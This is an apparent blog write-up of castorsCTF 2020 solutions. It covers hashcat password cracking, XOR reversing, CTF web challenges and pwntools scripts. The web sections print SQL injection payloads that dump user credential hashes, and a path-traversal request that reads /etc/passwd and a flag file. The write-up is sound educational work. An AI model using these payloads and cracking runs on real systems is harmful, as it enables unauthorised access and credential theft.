&nbsp;

Take each number as use as index in alphabet. Flag is `castorsCTF{omgsofunnylol}`.

&nbsp;
&nbsp;

## Password Crack 1
> 3c80b091de0981ec64e43262117d618a
>
> Do you rock?
>
> Wrap the flag in castorsCTF{***}

Hint clearly suggests the [commonly used rockyou.txt dictionary file](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases).

I use [hashcat](https://hashcat.net/hashcat/) for password hash cracking.

The given value is a raw MD5 hash. We can dump it into a file:

{% highlight bash %}
echo "3c80b091de0981ec64e43262117d618a" > pw_crack1_hash
{% endhighlight %}

And then using hashcat specify that [we want to crack a raw MD5 hash](https://hashcat.net/wiki/doku.php?id=example_hashes) using mode `0` and our rockyou dictionary:

{% highlight bash %}
hashcat -m 0 -a 0 pw_crack1_hash rockyou.txt
{% endhighlight %}

Which on my (measly) 6 year old Macbook Air runs in about 2 seconds:

```
Dictionary cache built:
* Filename..: ../../rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 2 secs

3c80b091de0981ec64e43262117d618a:irocktoo

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 3c80b091de0981ec64e43262117d618a
Time.Started.....: Mon Jun  1 10:52:06 2020 (0 secs)
Time.Estimated...: Mon Jun  1 10:52:06 2020 (0 secs)
Guess.Base.......: File (../../rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  3180.6 kH/s (11.76ms) @ Accel:64 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 983040/14344384 (6.85%)
Rejected.........: 0/983040 (0.00%)
Restore.Point....: 819200/14344384 (5.71%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#2....: prostamol -> computer?

Started: Mon Jun  1 10:52:04 2020
Stopped: Mon Jun  1 10:52:08 2020
```

Flag is `castorsCTF{irocktoo}`.

&nbsp;
&nbsp;

## Password Crack 2
> 867c9e11faa64d7a5257a56c415a42725e17aa6d
>
> You might need this: 653589
>
> Wrap the flag in castorsCTF{***}

Again, another password crack. Again, hashcat. This time, [looking up the hash](https://www.tunnelsup.com/hash-analyzer/) we see it's a SHA1 hash.

We also can assume that the _you might need this value_ is a salt.

First I'll try `hash:salt`:

{% highlight bash %}
echo "867c9e11faa64d7a5257a56c415a42725e17aa6d:653589" >> salted_sha1_pwcrack2
{% endhighlight %}

Set hashcat to attack a salted SHA1 hash (in form `hash:salt`, which from that reference page is `110`), and fire:

{% highlight bash %}
hashcat -m 110 -a 0 salted_sha1_pwcrack2  rockyou.txt
{% endhighlight %}

Gets us the flag again very quickly:

```
867c9e11faa64d7a5257a56c415a42725e17aa6d:653589:pi3141592
```

Flag is `castorsCTF{pi3141592653589}`.

&nbsp;
&nbsp;

## Password Crack 3
> 7adebe1e15c37e23ab25c40a317b76547a75ad84bf57b378520fd59b66dd9e12
>
> This one needs to be in the flag format first...

This one I should have asked about the challenge description before I let hashcat run for 6 hours on it.

Turns out that description meant, "Hey, the hash above represents the castorsCTF{<password>}" already wrapped in the flag format.

So, using the same rockyou dictionary, we can specify a [rule]() to hashcat that says "hey, I want to do X,Y,Z" on every word in the dictionary list too and not just the plain word. So, we'll specify a rule that tells hashcat to try every word, but preprend it with `castorsCTF{` and then append it with `}`. This is the flag format, and would be a good thing to know how to do in general for any CTF flag format.

In hashcat rule speak, that looks like this:

```
$} ^{ ^F ^T ^C ^s ^r ^o ^t ^s ^a ^c
```

You can read up on [hashcat rules](https://hashcat.net/wiki/doku.php?id=rule_based_attack), but the `^` character means prepend to the front and `$` means append to the end.

Lastly, [looking up the hash](https://www.tunnelsup.com/hash-analyzer/) we see it's a SHA256 hash.

```
echo "7adebe1e15c37e23ab25c40a317b76547a75ad84bf57b378520fd59b66dd9e12" » sha256_pwcrack3
```

So, we'll set hashcat to use SHA256 mode, and also tell it to use our rule set, with the `-r` flag:

```
hashcat -m 1400 -a 0 sha256_pwcrack3 rockyou.txt -r castors_ctf_rules.txt
```

This cracks almost instantly again:

```
7adebe1e15c37e23ab25c40a317b76547a75ad84bf57b378520fd59b66dd9e12:castorsCTF{theformat!}
```

Flag is `castorsCTF{theformat!}`.

&nbsp;
&nbsp;

## To Plant a Seed
> Did you know flags grow on trees? Apparently if you water them a specific amount each day the tree will grow into a flag! The tree can only grow up to a byte each day. I planted my seed on Fri 29 May 2020 20:00:00 GMT. The growth pattern is determined by the day-time the seed is planted. Just mix the amount of water in the list with the tree for 6 weeks and watch it grow!

Woof, this challenge was a nightmare. Even the author was not happy with it. I'll spare you the long agonizing back and forth of attempts and thoughts.

It ended up being a problem where we needed to re-create the seed value for the specific time mentioned in the challenge description (Fri 29 May 2020 20:00:00 GMT), and then once we have that seed value, we can seed Python random with it.

Once random is seeded, just take a random integer between 0 and 255 for every item in the watering pattern, XOR them, and print it as a char.

{% highlight python %}
#!/usr/bin/python3
import datetime
import random

waterings = [150, 2, 103, 102, 192, 216, 52, 128, 9, 144, 10, 201, 209, 226, 22, 10, 80, 5, 102, 195, 23, 71, 77, 63, 111, 116, 219, 22, 113, 89, 187, 232, 198, 53, 146, 112, 119, 209, 64, 79, 236, 179]

then_date = "29/05/2020-20:00:00"
seed_then = datetime.datetime.strptime(then_date, "%d/%m/%Y-%H:%M:%S").replace(tzinfo=datetime.timezone.utc).timestamp()
random.seed(seed_then)

for day in range(len(waterings)):
    char = waterings[day] ^ random.randint(0, 255)
    print(chr(char), end='')
print()
{% endhighlight %}

Seriously, no idea how anyone would have done this without talking to the author _at least once_.

Flag is `castorsCTF{d0n7_f0rg37_t0_73nd_y0ur_s33ds}`.

&nbsp;
&nbsp;

# Reversing
## XoR
> I feel xorry for anyone who tries to break my encryption.
>
> **\<xorry\>**

We get an attached binary. Opening it in Cutter, we see the main function:

{% highlight c %}
undefined8 main(undefined8 argc, char **argv){
    int64_t iVar1;
    int32_t iVar2;
    int64_t in_FS_OFFSET;
    int64_t var_60h;
    int64_t var_54h;
    int64_t var_40h;
    int64_t var_8h;
    
    iVar1 = *(int64_t *)(in_FS_OFFSET + 0x28);
    printf(0x9d4);
    fgets(&var_40h, 0x2c, _reloc.stdin);
    iVar2 = fcn.0000080a((char *)&var_40h);
    if (iVar2 == 0) {
        puts(0x9ed);
    } else {
        puts(0x9e1);
    }
    if (iVar1 != *(int64_t *)(in_FS_OFFSET + 0x28)) {
    // WARNING: Subroutine does not return
        __stack_chk_fail();
    }
    return 0;
}
{% endhighlight %}

So, looks like our bread and butter is `fcn.0000080a`. Looking at that guy:

{% highlight c %}
bool fcn.0000080a(char *arg1){
    int32_t iVar1;
    char *s1;
    int32_t var_10h;
    undefined8 var_ch;
    int64_t var_4h;

    iVar1 = strlen(arg1);
    var_10h = 0;
    while (var_10h < iVar1) {
        arg1[var_10h] = arg1[var_10h] ^ (char)var_10h + 10U;
        arg1[var_10h] = arg1[var_10h] + -2;
        var_10h = var_10h + 1;
    }
    iVar1 = strcmp(arg1, "gh}w_{aPDSmk$ch&r+Ah-&F|\x14z\x11P\x15\x10\x1dR\x1e");
    return iVar1 != 0;
}
{% endhighlight %}

Looks like a straight-forward XOR function. Take our input (passed to it as arg1), for every char in the argument (`while(var10_h < iVar1)`, while loop over the length of arg1), do some logic on it, and then make sure it matches the expect value (`"gh}w_{aPDSmk$ch&r+Ah-&F|\x14z\x11P\x15\x10\x1dR\x1e"`).

All we have to do is reverse the "do some logic on it" part and we have our flag.

{% highlight c %}
    while (var_10h < iVar1) {
        arg1[var_10h] = arg1[var_10h] ^ (char)var_10h + 10U;
        arg1[var_10h] = arg1[var_10h] + -2;
        var_10h = var_10h + 1;
    }
{% endhighlight %}

We can work backwards from the expected string and just do the above in reverse to get the flag.

{% highlight python %}
#!/usr/bin/env python3
from string import printable
alpha = printable
goal_output = 'gh}w_{aPDSmk$ch&r+Ah-&F|\x14z\x11P\x15\x10\x1dR\x1e'

flag=""
i = 0
for x in range(len(goal_output)):
    for char in alpha:
        try:
            if chr((ord(char)^(i + 10))-2) == goal_output[i]:
                flag+=char
                i+=1
                break
        except ValueError:
            pass
print(flag)
{% endhighlight %}

Flag is `castorsCTF{x0rr1n6_w17h_4_7w157}`.

&nbsp;
&nbsp;

# Web
## Car Lottery
> http://web1.cybercastors.com:14435

Going to the site, we see a page that says we need to be the XXXXXth visitor to proceed.

&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/lottery/homepage.png)
&nbsp;

Refreshing that page, you can see the value increase, but would take _way_ too long to reach the required number. Instead, we suspect the value is stored as a cookie.

`Chrome top toolbar --> View --> Developer --> Developer Toolbar --> Application tab (on top) --> Cookie tab (on left)` and indeed we see a cookie named "client" that looks like is used for our "visitor number" + 35.

So, just set it to `3123248` and refresh the page.

&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/lottery/in_home.png)
&nbsp;

The "Types of Car" dropdown leads us to one of three pages that look like
* http://web1.cybercastors.com:14435/search?id=1
* http://web1.cybercastors.com:14435/search?id=2
* http://web1.cybercastors.com:14435/search?id=3

So, the `?id=3` is suspicious, and leads to thinking potentially SQL injection. There are a ton of web resources out there that describe the telltale signs of SQL injection/some common commands/approaches, so I won't try. I will say, I did not know how to do SQL injection before this CTF, so it was simple enough to learn with this example in this case. In particular, I really liked:

* [SQL injection CTF cheat sheet](https://github.com/w181496/Web-CTF-Cheatsheet#sql-injection)
* [Dumping a complete DB using SQL injection](https://resources.infosecinstitute.com/dumping-a-database-using-sql-injection/#gref)
* [MySQL DB command reference](http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm)

Looking at the request in Burpsuite using the intercepter, we see it is making a request with a body of `car=Sport` or `car=Minivan` or `car=Sedan`.

So one can image the query might look something like:

```
SELECT * FROM cars WHERE car_type=<id>
```

If you send `id=CHAR(39) OR 1=1 --` (CHAR(39) is `'` but without encoding the quote as so seems to yield a MariaDB sql syntax error), you get back valid results. So it is indeed a SQL injection problem.

Sending `CHAR(39) AND 1=2 UNION SELECT version(),version(),user(),3,4 -- ` (trailing space after the `--` is **important**), we get back:

{% highlight html %}
  <tr>
    <td style="text-align:center">10.4.13-MariaDB-1:10.4.13+maria~bionic</td>
    <td style="text-align:center">3</td>
    <td style="text-align:center">root@172.18.0.3</td>
    <td style="text-align:center">4</td>
  </tr>
{% endhighlight %}

So we can use sql commands like `version()` to get information about the database running. We can try to get the list of Tables like so:

`CHAR(39) AND 1=2 UNION SELECT version(),group_concat(table_name),database(),3,4 from information_schema.tables where table_schema=database() -- `:

Which gives us:

{% highlight html %}
    <td style="text-align:center">Cars,Users</td>
    <td style="text-align:center">3</td>
    <td style="text-align:center">cars</td>
    <td style="text-align:center">4</td>
{% endhighlight %}

So that `Users` table looks suspicious, that's not related to cars at all. We can further check all the columns as well, like so:

`CHAR(39) AND 1=2 UNION SELECT version(),group_concat(column_name),database(),3,4 from information_schema.columns where table_schema=database() -- `

which gives us:

{% highlight html %}
Id,Type,Model,Make,Year,Username,Password
{% endhighlight %}

So, seems like we should be taking `Username` and `Password` from the `Users` table.

`CHAR(39) AND 1=2 UNION SELECT version(),concat(Username,':',Password),database(),3,4 from Users`

Gives us back (after formatting):

```
admin@cybercastors.com:cf9ee5bcb36b4936dd7064ee9b2f139e
admin@powerpuffgirls.com:fe87c92e83ff6523d677b7fd36c3252d
jeff@homeaddress.com:d1833805515fc34b46c2b9de553f599d
moreusers@leakingdata.com:77004ea213d5fc71acf74a8c9c6795fb
```

The hashes are simple passwords easily cracked with an online Rainbow table, and they are:

```
naruto
powerpuff
pancakes
fun
```

So, nothing related to the flag. Discord was mentioning something about "if only there was a secret portal".

Running `dirb` (or whatever your favorite directory finder is), we end up finding the following web page:

* http://web1.cybercastors.com:14435/dealer

Going to this, we see it asks for email/password credentials. Trying the `admin@cybercastors.com` email and `naruto` password from above, we get the flag:

&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/lottery/flag.png)
&nbsp;

Flag is `castorCTF{daT4B_3n4m_1s_fuN_N_p0w3rfu7}`.

&nbsp;
&nbsp;

## Quiz
> Our intern, Jeff, received a brief introduction to Golang and decided to write a Web app that quizzes users.
>
> http://web1.cybercastors.com:14436

Going to the site, we see this home page:

&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/quiz_home.png)
&nbsp;

Looking around here, there isn't really much of anything. View source doesn't reveal anything hidden, and no weird cookies are set.

Clicking on **Math**, we go to:

&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/quiz_problems.png)
&nbsp;

Here it looks like we select a problem number 1-13, and then give it a decimal answer. Doing the problems, the math works out.

However, if you enter something that is not a number between 1-13 (or not a number, particularly) you'll notice the App complains about being unable to convert it:

> strconv.Atoi: parsing "one": invalid syntax

I fired up burp and looked at a answer submission in the intercept tab, and it looked like the following POST data:

> `index=1&var=10;1&submit-btn=Submit`

Where 1 was the problem and 10 was the answer guess.

At this point, I tried some SQL injection but no matter what it would complain about the go syntax not being correct. So it didn't seem like sql injection was the right path. After a while longer of stumbling around, I noticed this was buried in the Discord:

> … i think for quiz a pretty good wordlist will do ...

So - maybe some hidden pages? I fired up `dirb` on the root of the webpage (`http://web1.cybercastors.com:14436`) and let it run.

```
dirb http://web1.cybercastors.com:14435 dirb-master/wordlists/common.txt
```

It returned a few endpoints, one which particularly looked interesting: `/backup`. Navigating to that page, we see the full source code for the Go webapp (lol):

{% highlight go %}
package main

import (
	"bufio"
	"encoding/csv"
	"fmt"
	"html/template"
	"net/http"
	"net/url"
	"os"
	"strconv"

	"github.com/julienschmidt/httprouter"
)

var local *template.Template
var probs *template.Template

func init() {
	local = template.Must(template.ParseGlob("./files/*"))
	probs = template.Must(template.ParseGlob("./problems/*"))
}

func main() {
	mux := httprouter.New()

	mux.GET("/", index)
	mux.GET("/test/:directory/:theme/:whynot", super)
	mux.GET("/problems/math", math)
	mux.POST("/problems/math", mathCheck)

	//Remember to Delete
	mux.GET("/backup/", backup)

	//Serve File with Directory listing
	http.ListenAndServe(":8080", mux)
}
func index(w http.ResponseWriter, req *http.Request, _ httprouter.Params) {
	err := local.ExecuteTemplate(w, "start.html", nil)
	handleError(w, err)
}

func backup(w http.ResponseWriter, req *http.Request, _ httprouter.Params) {
	http.ServeFile(w, req, "main.go")
}

func mathCheck(w http.ResponseWriter, req *http.Request, _ httprouter.Params) {
	err := req.ParseForm()
	handleError(w, err)
	check(w, req.Form)
}
func math(w http.ResponseWriter, req *http.Request, _ httprouter.Params) {
	game(w)
}
func file(w http.ResponseWriter, req *http.Request, _ httprouter.Params) {
	http.FileServer(http.Dir("."))
}

func check(w http.ResponseWriter, form url.Values) {
	answers, err := os.Open("problems/answers.csv")
	handleError(w, err)

	data, _ := csv.NewReader(answers).ReadAll()

	index, err := strconv.Atoi(form["index"][0])
	handleError(w, err)
	value := form["var"][0]

	f_answers := make(map[int]string)

	for i, v := range data {
		f_answers[i+1] = v[0]
	}

	if f_answers[index] == value {
		last := struct {
			Header string
			SorC   string
		}{
			"correct!!",
			"Congrats!",
		}

		err := probs.ExecuteTemplate(w, "mathCheck.gohtml", last)
		handleError(w, err)
	} else {
		last := struct {
			Header string
			SorC   string
		}{
			"incorrect.",
			"Sorry...",
		}

		err := probs.ExecuteTemplate(w, "mathCheck.gohtml", last)
		handleError(w, err)

	}

}
func super(w http.ResponseWriter, req *http.Request, ps httprouter.Params) {
	fmt.Println(ps.ByName("whynot"))
	var file string = "/" + ps.ByName("directory") + "/" + ps.ByName("theme") + "/" + ps.ByName("whynot")
	test, err := os.Open(file)
	handleError(w, err)
	defer test.Close()

	scanner := bufio.NewScanner(test)
	var content string
	for scanner.Scan() {
		content = scanner.Text()
	}

	fmt.Fprintf(w, "Directories: %s/%s\n", ps.ByName("directory"), ps.ByName("theme"))
	fmt.Fprintf(w, "File: %s\n", ps.ByName("whynot"))
	fmt.Fprintf(w, "Contents: %s\n", content)
}

func handleError(w http.ResponseWriter, err error) {
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		fmt.Print(err)
	}
}

func game(w http.ResponseWriter) {
	problems, err := os.Open("problems/problems.csv")
	if err != nil {
		fmt.Println(err)
	}

	data, err := csv.NewReader(problems).ReadAll()

	//Create empty struct to contain questions and their indexes
	questions := struct {
		Index    int
		Question string
	}{}
	ques := make([]struct {
		Index    int
		Question string
	}, 0)
	for i, v := range data {
		questions.Index = i + 1
		questions.Question = v[0]
		ques = append(ques, questions)
	}

	err = probs.ExecuteTemplate(w, "math.gohtml", ques)
	handleError(w, err)
}
{% endhighlight %}

We can see that the following is handling the routes for our requests:

{% highlight go %}
        mux.GET("/", index)
        mux.GET("/test/:directory/:theme/:whynot", super)
        mux.GET("/problems/math", math)
        mux.POST("/problems/math", mathCheck)

        //Remember to Delete
        mux.GET("/backup/", backup)
{% endhighlight %}

Making requests from that `math` page above, we are using `/problems/math`, which looking at the handling functions, we can see lines up.

But, the `mux.GET("/test/:directory/:theme/:whynot", super)` handler looks suspect. The handler (`super`) for that path is, from above,

{% highlight go %}
func super(w http.ResponseWriter, req *http.Request, ps httprouter.Params) {
        fmt.Println(ps.ByName("whynot"))
        var file string = "/" + ps.ByName("directory") + "/" + ps.ByName("theme") + "/" + ps.ByName("whynot")
        test, err := os.Open(file)
        handleError(w, err)
        defer test.Close()

        scanner := bufio.NewScanner(test)
        var content string
        for scanner.Scan() {
                content = scanner.Text()
        }

        fmt.Fprintf(w, "Directories: %s/%s\n", ps.ByName("directory"), ps.ByName("theme"))
        fmt.Fprintf(w, "File: %s\n", ps.ByName("whynot"))
        fmt.Fprintf(w, "Contents: %s\n", content)
}
{% endhighlight %}

Looking at this, it's clear that if we give it `/test/dir1/dir2/file`, it will give us back the file if it exists! We can abuse this to try to find our flag file.

At first, I tried brute forcing all two directory deep files, using `dirstalker` (which has a default depth of 3). I let it run for quite a while before deciding that that was not going to yield any results. Similar with dirsearch/dirb/etc.

Instead, I started playing around with the pages manually in the browser. I actually ended up accidentally remembering that multiple trailing `/` are treated as one with file path lookups, so we no longer needed to look for a file that was three directories deep!

Soemthing like `/test//etc/passwd` for example (which yielded the `/etc/passwd` of the server). I played around with this for a while, and was able to read quit a lot of the standard system files. I tried `/home/<guessing directories>/flag` but that was not successful.

On a try, I noticed that if you list is just a directory, like `/test///home`, it would effectively return whether or not the directory existed (and this was the example I used). Then, I started trying `/test//<name>/home` to see what user's existed. After about a minute, I remembered the challenge prompt:

> Our intern, **_Jeff_**, ...

And after trying, `/test//home/jeff` returned that it existed! Then it was just a matter of guessing the flag name. I tried the standard `flag`, `fl4g`, etc... and it ended up being `flag.txt`. The full path was `/test/home/jeff/flag.txt`. That endpoint gave us:

{% highlight bash %}
curl -s "http://web1.cybercastors.com:14436/test/home/jeff/flag.txt"
Directories: home/jeff
File: flag.txt
Contents: castorsCTC{wh0_l4iks_qUiZZ3s_4nyW4y}
{% endhighlight %}

After fixing the flag spelling, it was accepted. Flag is `castorsCTF{wh0_l4iks_qUiZZ3s_4nyW4y}`.

&nbsp;
&nbsp;

## Mixed Feelings
> We tried to tell Jeff that one doesn't go with the other but he didn't listen. Can you please pwn him and reveal his dirty secrets? Also for some reason they told us he likes XXXTentacion.
>
> http://web1.cybercastors.com:14439/

The web page was some nice ASCII art, but not much else. Looking at the source view "View Source", we see the following commented out PHP code:

{% highlight php %}
if(isset($file)) {
    if ($user == falling_down_a_rabit_hole) {
        exit()?
    }
    else {
        go to .flagkindsir
    }
}
{% endhighlight %}

So, it seems that we can try navigating to `/.flagkindsir` (http://web1.cybercastors.com:14439/.flagkindsir).

Once there, we have the option of clicking two thing values, either cookies or puppies. Either of which will bring you to a different web site entirely as they end up in POST requests about those values.

Looking at the request in Burp intercept, I noticed that it is sending the body `cookies=cookies` or `cookies=puppies`. I tried `cookies=flag` thinking maybe it was that easy, and it was! I don't know why this had such a high score.

Simply resubmit the request and between the intercept, change the value after `cookies=` to `flag`.

Flag is `castorsCTF{4_w1ld_fl4g_h0w_d1d_y0u_s0_cl3verLy_g3t_it}`.

&nbsp;
&nbsp;

# Forensics
## Manipulation
> One of our clients sent us the password but we got this instead. He insists the password is in the image, can you help us?
>
> **\<pooh.jpg\>**

The attached JPG is corrupted and won't open as a photo. Looking at the file, we see it's actually in a hexdump format:

```
00000120: ffd8 ffe0 0010 4a46 4946 0001 0101 012c  ..........JFIF..
00000130: 0100 0001 0001 0000 ffdb 0043 0008 0606  ...........C....
00000140: 0706 0508 0707 0709 0908 0a0c 140d 0c0b  ................
00000150: 0b0c 1912 130f 141d 1a1f 1e1d 1a1c 1c20  ...............
00000160: 242e 2720 222c 231c 1c28 3729 2c30 3134  $.' ",#..(7),014
00000170: 3434 1f27 393d 3832 3c2e 3334 32ff db00  44.'9=82<.342...
00000180: 4301 0909 090c 0b0c 180d 0d18 3221 1c21  C...........2!.!
00000190: 3232 3232 3232 3232 3232 3232 3232 3232  2222222222222222
...
```

So we can strip the hexdump information and get just the values, but even still the photo does not render.

Looking again, we notice that the file doesn't have the expected [initial "magic bytes" for a `.jpg` file](https://en.wikipedia.org/wiki/List_of_file_signatures). Looking in the file, we notice it's at the very bottom. Simply taking the line and moving it to the top we get it in the right format.

Then we need to convert the hex information to bytes. You can use `xxd`, whatever. I used a Python script and PIL:

{% highlight python %}
#!/usr/bin/env python3

import binascii

with open('pooh_hex.jpg', 'r') as infile:
    # pooh_hex generated by:
    # (After fixing the header by taking the last line at the end of the file
    # and placing it at:
    #     00000120: ffd8 ffe0 0010 4a46 4946 0001 0101 012c
    # cat pooh.jpg | awk '{print $2 $3 $4 $5 $6 $7 $8 $9}' | pbcopy
    hex_string=''.join(infile.read().split('\n'))

data = binascii.a2b_hex(hex_string)
with open('pooh_reconstructed.jpg', 'wb') as image_file:
    image_file.write(data)
    # castorsCTF{H3r3_Is_y0uR_Fl4gg}
{% endhighlight %}

Running this gives us the proper image:

&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/pooh_constructed.jpg)
&nbsp;

Flag is `castorsCTF{H3r3_Is_y0uR_Fl4gg}`.
&nbsp;
&nbsp;

## Leftovers

> We suspect a user has been typing faster than a computer. Our analyst don't know what to make of it, maybe you will be the one to shine light on the subject.
>
> **\<interupts.pcapng\>**

As much as I hate Wireshark, this one was pretty cool. We're given a packet capture file. Looking at the file in wireshark, we see a bunch of USB pcap traffic. I had not done keyboard pcap in a CTF before. But looking around, there is quite a bit of resources available for extracting keystrokes out of a USB pcap. I ended up using [this TeamRocketist CTF USB keyboard parser](https://github.com/TeamRocketIst/ctf-usb-keyboard-parser).

In order to first extract out all the required keyboard information, just follow the instructions on that repo:

{% highlight bash %}
tshark -r interrupts.pcapng -Y 'usb.capdata && usb.data_len == 8' -T fields -e usb.capdata | sed 's/../:&/g2' > usbPcapData
{% endhighlight %}

Once we have that extracted, just run the tool from that repo:

{% highlight bash %}
python usbkeyboard.py ../usbPcapData
what doyo thng yu will fn her? ths? cstos[CAPSLOCK]ctf[CAPSLOCK]{1stiswhatyowant}
{% endhighlight %}

After interpreting that output, we see the flag is `castorsCTF{1stiswhatyowant}`.

&nbsp;
&nbsp;

# Coding

All of the coding ones were trivial solves, and all easily done in pwntools.

## Arithmetics
> 2 plus two = ?
>
> nc chals20.cybercastors.com 14429

Simple arithemtic. After a while, the operations are replaced with their words (i.e. `+` is `plus`) and the numbers are replaced with their word (i.e. `1` is `one`).

Some simple python libraries to handle that if you're even too lazy to do it yourself:
* [word2number](https://pypi.org/project/word2number/)
* operator (pre-shipped)

{% highlight python %}
#!/usr/bin/env python3

from pwn import *
# pip install word2number
from word2number import w2n
import operator

context.log_level = "debug"
r = remote('chals20.cybercastors.com', 14429)

r.recvuntil('when ready.\n')
r.sendline()

ops = { "+": operator.add, "-": operator.sub, "*": operator.mul, "//": operator.floordiv }

while 1<2:
    problem = r.recvline().decode().strip().split()

    try:
        lhand = int(problem[-4])
    except ValueError:
        lhand = w2n.word_to_num(problem[-4])
    try:
        rhand = int(problem[-2])
    except ValueError:
        rhand = w2n.word_to_num(problem[-2])

    op = problem[-3]
    if op == "divided-by":
        op = "//"
    elif op == "multiplied-by":
        op = "*"
    elif op == "minus":
        op = "-"
    elif op == "plus":
        op = "+"

    r.sendline(str(ops[op](lhand, rhand)))
    r.recvline()
{% endhighlight %}

Flag is `castorsCTF(n00b_pyth0n_4r17hm3t1c5}`.

&nbsp;
&nbsp;

# Glitchity Glitch
> If you wanna take your mind off things, you're more than welcome to visit our shop.
>
> nc chals20.cybercastors.com 14432

Connecting to the endpoint, it's a game where you start with $100. We can buy the flag, but it cost's _way_ more money than we have.

Trying to buy and sell all the items, realize that when you sell the "private dns" item, it doesn't remove it from your inventory. So buy it once, and then just sell over and over until you have enough money to buy the flag item.

{% highlight python %}
#!/usr/bin/env python3
from pwn import *
context.log_level = "debug"
r = remote('chals20.cybercastors.com', 14432)
r.recvuntil('Choice: ')
r.sendline("6")

for _ in range(1001):
    r.recvuntil('Choice: ')
    r.sendline("0")
    r.recvuntil('Choice: ')
    r.sendline("1")

r.recvuntil('Choice: ')
r.sendline("5")
r.stream()
{% endhighlight %}

Flag is `castorsCTF{$imPl3_sTUph_3h?}`.

&nbsp;
&nbsp;

## Flag Gods
> The flag gods are trying to tell you something...
>
> nc chals20.cybercastors.com 14431

Connecting to the endpoint gives us:

```
\  ___/\ \    /\  __ \/\  ___\     /\  ___\/\  __ \/\  __-./\  ___\   
\ \  __\ \ \___\ \  __ \ \ \__ \    \ \ \__ \ \ \/\ \ \ \/\ \ \___  \  
 \ \_\  \ \_____\ \_\ \_\ \_____\    \ \_____\ \_____\ \____-\/\_____\ 
  \/_/   \/_____/\/_/\/_/\/_____/     \/_____/\/_____/\/____/ \/_____/ 
                                                                                                                                                             

We have a small problem...
The flag gods are trying to send us a message, but our transmitter isn't calibrated to
decode it! If you can find the hamming distance for the following messages we may be
able to calibrate the transmitter in time. Entering the wrong distance will lock the
machine. Good luck, we'll only have 20 seconds!
Hit <enter> when ready.

The machine is currently 20% calibrated.
Transmitted message: The clueless monkey hits a dragon occasionally.
Received message: 32f71afeccc30cf89598089d5d96b811904ac2ceb2979b88db9add9c0f8bd8c091d7d99d9a9c8f0692819ac35786c1
Enter hamming distance:
```

So we need to find the hamming distance between the transmitted message and the received message. Just convert transmitted to hex and then find the hamming distance between the two hex strings.

I used the [hexhamming](https://pypi.org/project/hexhamming/) library, because no need to re-invent the wheel.

{% highlight python %}
#!/usr/bin/env python3
from pwn import *
from binascii import hexlify
from hexhamming import hamming_distance
context.log_level = "debug"

r = remote('chals20.cybercastors.com', 14431)
r.recvuntil('when ready.\n')
r.sendline()

while 1<2:
    r.recvline() # machine is currently XX% calibrated
    sentence = " ".join(r.recvline().decode().strip().split()[2:]).encode()
    received = r.recvline().decode().strip().split()[2]
    hex_sentence = hexlify(sentence).decode()
    print(received)
    print(hex_sentence)
    r.sendline(str(hamming_distance(hex_sentence, received)))
    r.recvline() # Correct answer!
{% endhighlight %}

Flag is `castorsCTF{c0mmun1ng_w17h_7h3_f14g_g0d5}`.

&nbsp;
&nbsp;

## Base Runner
> Can you beat The Flash?
>
> nc chals20.cybercastors.com 14430

Connecting to the endpoint, we get a banner message that tells us we need to run a bunch of bases. When we press enter, we get a bunch of 0's and 1's (presumably binary). Decoding that seems to lead to a different _base_. So, just convert through the bases until we get the flag.


{% highlight python %}
#!/usr/bin/env python3
from pwn import *
from base64 import b64decode
context.log_level = "debug"

r = remote('chals20.cybercastors.com', 14430)
r.recvuntil('when ready.\n')
r.sendline()

while 1<2:
    problem = r.recvline()
    problem = problem.decode().strip().split()

    octal_ = ""
    hex_ = ""
    for term in problem:
        n = int(term, 2)
        octal_ += (n.to_bytes((n.bit_length() + 7) // 8, 'big').decode())
    for term in octal_.split():
        n = int(term, 8)
        hex_ += (n.to_bytes((n.bit_length() + 7) // 8, 'big').decode())
    b64 = bytearray.fromhex(hex_.replace(" ", "")).decode()
    r.sendline(b64decode(b64))
    r.recvline() # Correct answer!
{% endhighlight %}

Correct ordering was binary -> octal -> hex -> base64 -> plaintext.

Flag is `castorsCTF[m4j0r_l34gu3_py7h0n_b4s3_runn3r}`.

&nbsp;
&nbsp;

